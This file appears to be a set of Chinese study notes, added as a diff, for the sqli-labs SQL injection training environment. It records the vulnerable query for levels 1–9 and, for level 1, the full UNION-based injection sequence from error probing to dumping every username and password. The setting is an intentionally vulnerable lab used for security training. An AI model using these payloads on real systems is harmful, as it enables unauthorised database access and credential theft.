@@ -1,0 +1,49 @@
+Less-1:$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+	{ http://172.18.135.74/sqlilabs/Less-1/?id=1'
+	出现以下结果
+	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+	提取其中的一段是： '   1'   ' LIMIT 0,1  多了一个引号。导致错误。 
+	简单的说这个底层使用的查询语句是：select Login_name,password from TABLE where id='input';
+	判断一个注入是否为单引号注入需要在其id=？后加一个单引号看其实否报错。报错后再'后面加上%23或者-- 注释掉后面的语句 若返回正常则说明是单引号注入。
+	也可以用 -- # /* */ 来注释掉后面要执行的语句 
+	输入/Less-1/?id=1' order by 1-2-3-4 --+   发现在4的时候报了一个错误  说明查询的是TABLE里的三个字段即select a,b,c from TABLE where id='   input   ';
+	输入/Less-1/?id=1' union select 1,2,3 --+ 返回正常
+	输入/Less-1/?id=1111' union select 1,2,3 --+ 返回you LoginName 2  you password 3; 2的意思是第二个字段是Login_name 3的意思是第三个字段是Password
+	输入/Less-1/?id=1111' union select 1,version(),database() --+ 返回数据库的版本是:5.5.44-0ubuntu0.14.04.1 数据库名是:security
+	输入/Less-1/?id=-1' union select 1,database(),@@datadir --+ 返回数据库的名字和数据库所在的路径
+	输入/Less-1/?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security' --+返回对应的数据存在那个表中
+	输入/Less-1/?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0-1-2-3,1 --+ 返回的是你当前数据库中有哪些表
+	输入/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ 一次返还给你数据库中所有的表emails,referers,uagents,users
+	输入/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+返还给数表中字段的名字id,username,password
+	输入/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='emails'--+返还emails中的字段名:id,email_id
+	输入/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='referers'--+返回referers表中的字段名:id,referer,ip_address
+	输入/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='uagents'--+返回uagents表中的数据:id,uagent,ip_address,username
+	输入/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users--+返回users表中所有的用户名和密码
+	}
+Less-2:$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+Less-3:$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
+	{ htt://172.18.135.74/sqlilabs/Less-3/?id=1   返回正常
+	输入'则返回如下错误 ''1'') LIMIT 0,1' at line 1 
+	提取错误：'   1'   ') LIMIT 0,1  
+	输入/Less-3/?id=1'--+ 则返回 '' at line 1  _>
+	输入:/Less-3/?id=1\ 返回''1\') LIMIT 0,1' at line 1 _> '           '             1\           ') LIMIT 0,1          ' 
+	由此可以推断出底层是 select login_name,pasword from TABLE where id=('  input  ');}
+Less-4:$id = '"' . $id . '"'; $sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
+	{http://172.18.135.74/sqlilabs/Less-4/?id=1  返回正常
+	输入Less-4/?id=1' 返回正常
+	输入Less-4/?id=1\ 返回'"1\") LIMIT 0,1' at line 1   _>	'     "        1\     ")
+	输入Less-4/?id=1" 返回'"1"") LIMIT 0,1' at line 1   _>  '     "        1"     ")
+	输入Less-4/?id=2")--+ 返回正常
+	由此可以推断出底层是select login_name,password from TABLE where id=("    input    ");
+Less-5:$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+Less-6:$id = '"'.$id.'"'; $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+Less-7:$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
+Less-8:$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+Less-9:$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+
+
+注释：
+	seletc table_name from information_schema.tables where table_schema="security";  是查询的模型  查询sceurity中表的名字
+	select table_name from information_schema.tables where table_schema =database();
+	select column_name from information_schema.columns where table_name ='users';   查询字段信息
+	group_concat()函数是如果函数包含的字段在后缀的表中有  则全部列出来
